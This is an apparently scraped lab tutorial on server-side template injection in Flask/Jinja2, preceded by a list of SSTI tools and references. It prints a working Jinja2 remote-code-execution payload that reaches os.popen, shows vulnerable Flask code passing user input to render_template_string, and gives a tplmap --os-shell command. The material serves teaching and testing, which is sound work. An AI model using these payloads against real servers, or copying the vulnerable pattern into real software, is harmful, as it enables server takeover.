- [Tplmap](https://github.com/epinna/tplmap)
- [Backslash Powered Scanner Burp Suite extension](https://github.com/PortSwigger/backslash-powered-scanner)
- [Template expression test strings/payloads list](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)

## References

- [James Kettle: Server-Side Template Injection:RCE for the modern webapp (whitepaper)](https://portswigger.net/kb/papers/serversidetemplateinjection.pdf)
- [Server-Side Template Injection](https://portswigger.net/blog/server-side-template-injection)
- [Exploring SSTI in Flask/Jinja2](https://www.lanmaster53.com/2016/03/exploring-ssti-flask-jinja2/)
- [Server Side Template Injection: from detection to Remote shell](https://www.okiok.com/server-side-template-injection-from-detection-to-remote-shell/)
- [Extreme Vulnerable Web Application](https://github.com/s4n7h0/xvwa)
- [Divine Selorm Tsa: Exploiting server side template injection with tplmap](https://owasp.org/www-pdf-archive/Owasp_SSTI_final.pdf)
- [Exploiting SSTI in Thymeleaf](https://www.acunetix.com/blog/web-security-zone/exploiting-ssti-in-thymeleaf/)


##
##

Remote Code Execution on Jinja - SSTI Lab

###################################
https://secure-cookie.io/attacks/ssti/
###################################

Tags:

    web attack ssti injection rce remote code execution 

Table of contents

    TL;DR - show me the fun part❗
    What is template❓
    What is server side template injection❓
    How is that exploitable❓
    Remote Code execution 💥
    Show me the source code of the vulnerable app 👀
    What tool did you use in the video❓
    Questions❓
    References

TL;DR - show me the fun part❗

    Open the app

    Discover template injection –>

    {{7*7}}

    Execute “ls” command –>

    {{"foo".__class__.__base__.__subclasses__()[182].__init__.__globals__['sys'].modules['os'].popen("ls").read()}}

    Get paid, maybe?

Sorry, your browser doesn't support embedded videos.
What is template❓

In simple words, it’s an HTML file that contains variables. Something like

<h1>{{greeting}}!</h1>

Depending on the template type, a variable greeting is defined between {{ }}.

If we pass “hello username” to greeting, then the HTML would be

<h1>hello username!</h1>

A common example is, when a user login into app, the app fetch the name of the user and pass it to greeting variable. The user will see

hello username!

So templates are used by backend app to render data dynamically into HTML.

Depending on the backend programming language, there are different types of web template. Such as Jinja2(Python), Twig(PHP), FreeMarker(Java).
What is server side template injection❓

If the app blindly takes a user input (such as username) and render it into a template. Then the user can inject arbitrary code which the template will evaluate.

Such injection, will allow the user to access some APIs and methods which are not supposed to.

How to discover the flaw❓

Usually manually, with trial and error. If we don’t know the type of the template engine, then we inject a set of various template syntax. Portswigger provides an extensive approach to spot the vulnerability with different template types.

For this demo, I will be using Python and Jinja template.

In Jinja, if you pass an operation like {{7*7}} and the app evaluated 7*7 and returned 49

<h1>49!</h1>

then the app is vulnerable to server side template injection🎉.
How is that exploitable❓

So, after an attacker figures out template injection, then what?

The template evaluation happens on the server side. Meaning if the attacker somehow finds a way to make the template access the underlying operating system, the user can take over the server.

Let’s give it a try!

    Injecting direct os commands like ls or even using Python OS module;

    {{ ls }}

    {{ import os; os.system("ls") }}

    {{ import os }}

    ❌ Is not going to work in jinja. And if the web developer doesn’t handle exceptions properly, the app will return an exception like this one

jinja’s exception upon injecting Python import statement (click to enlarge)

So Jinja engine limits what we can inject. If we can’t import modules, then what can we do?

    let’s try with adding a simple Python datatype like a string

    {{"foo"}}

    ✅ It gets evaluated as normal string foo.

    What if use a builtin methods for string, like convert to upper case

    {{"foo".upper()}}

    ✅ It gets evaluated to uppercase: FOO

Knowing that we can access builtin Python methods, is there a way to take an advantage out of this❓

If we can somehow access Python ‘os’ module using a string, then we can execute os commands.

Let’s find out if Python’s magic allows us to do so!
Remote Code execution 💥

Python is an Object Oriented Programming. It has objects, classes, class inheritance, ..etc.

Everything in Python is an object. When you create a string, try to print out its type, you will see it’s an object that belongs to class str

foo = "myString"
print(type(foo))
<class 'str'> # output

Since everything is an object, Python by default provides some builtin methods called magic methods (which starts and ends with double underscore) such as

__init__

We saw that we could access built methods (like "string".upper()).

🔥 💥What if i told you that injecting this Python snippet:

{{ "foo".__class__.__base__.__subclasses__()[182].__init__.__globals__['sys'].modules['os'].popen("ls").read()}}

will result with a remote code execution and the server will execute “ls” command and list back files and folders (play.py, static, template).
remote code execution result

I know that your first reaction will be 👇

Let me explain.

Remember that our end goal, is to get to ‘os’ module. To do so, we will be using the available magic methods.

Here’s a break down for the exploit,
jinja exploit (click to enlarge)

    Give me the class for “foo” string, it returns

    <class 'str'>

    Give me the name of the base class. In other words, give me the parent class that child class ‘str’ inherits from, it returns

    <class 'object'>

    👉 At this point, we are at class ‘object’ level.

    Give me all the child classes that inherits ‘object’ class, it returns a list

    [<class 'type'>, <class 'weakref'>, ....etc

    Give me the class that is located in index #182, this class is

    <class 'warnings.catch_warnings'>

    We chose this class, because it imports Python ‘sys’ module , and from ‘sys’ we can reach out to ‘os’ module.

    Give me the class constructor (__init__). Then call (__globals__) which returns a dictionary that holds the function’s global variables. From this dictionary, we just want [‘sys’] key which points to the sys module,

    <module 'sys' (built-in)>

    👉 At this point, we have reached the ‘sys’ module.

    ‘sys’ has a method called modules, it provides access to many builtin Python modules. We are just interested in ‘os’,

    <module 'os' from '/Library/Frameworks/Python.framework/Versions/3.7/lib/python3.7/os.py'>

    👉 At this point, we have reached the ‘os’ module.

    Guess what. Now we can invoke any method provided from the ‘os’ module. Just like the way we do it form the Python interpreter console.

    So we execute os command “ls” using popen and read the output🎉.

Show me the source code of the vulnerable app 👀

    App gets user’s input via request parameter ‘name’.

    Pass the untrusted user’s input directly to render_template_string method.

    Template engine, evaluates the exploit, causing SSTI.

@app.route("/", methods=['GET'])
def home():
    try:
        name = request.args.get('name') or None # get untrusted query param
        greeting = render_template_string(name) # render it into template

What tool did you use in the video❓

tplmap. While no longer maintained, it still works!

python2.7 tplmap.py -u "http://127.0.0.1:5000/?name" --os-shell

For obvious security reasons, running this tool against online lab, won’t work.
Questions❓

Hit me up.
References

[1] Portswigger

[2] PwnFunction()
